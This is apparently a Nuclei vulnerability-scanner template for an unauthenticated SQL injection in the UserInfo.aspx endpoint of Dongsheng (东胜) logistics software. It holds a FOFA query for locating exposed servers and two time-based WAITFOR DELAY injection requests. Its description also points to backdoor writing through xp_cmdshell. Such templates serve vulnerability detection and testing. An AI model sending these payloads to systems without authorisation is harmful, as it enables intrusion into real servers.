id: dongsheng-logistics-software-userinfo-ashx-sql-injection

info:
  name: "东胜物流软件 UserInfo.aspx SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="东胜物流软件-物流软件"

    该漏洞存在于东胜物流软件的 UserInfo.aspx 接口中。攻击者无需身份验证即可利用此 SQL 注入漏洞执行任意 SQL 语句。通过调用 xpcmdshell，攻击者能够写入后门文件并执行任意代码，最终导致服务器权限被完全控制。
  tags: 东胜物流软件

http:
- raw:
  - |
    GET /Areas/Mobile/Views/Login/UserInfo.aspx?openid=1%27WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /Areas/Mobile/Views/Login/UserInfo.aspx?openid=1%27WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=5 && duration_1<=6'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
